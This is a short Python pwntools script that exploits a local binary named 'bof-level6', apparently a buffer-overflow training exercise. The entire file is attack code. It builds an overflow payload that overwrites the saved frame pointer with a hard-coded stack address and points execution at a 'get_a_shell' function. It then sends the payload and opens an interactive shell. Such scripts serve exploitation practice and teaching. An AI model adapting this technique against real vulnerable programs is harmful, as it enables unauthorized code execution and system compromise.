#!/usr/bin/env python
import sys

from pwn import *

context.terminal = "/bin/bash"

p = process("./bof-level6")

target_rbp_value = p64(0x7fffffffe2b0)

get_a_shell_addr = p64(0x40063a)
buf = 'ABCDEFGH' + get_a_shell_addr + 'A' * 0x70 + target_rbp_value

if (len(sys.argv) > 1 and sys.argv[1] == "g"):
    gdb.attach(p)

p.sendline(buf)

p.interactive()
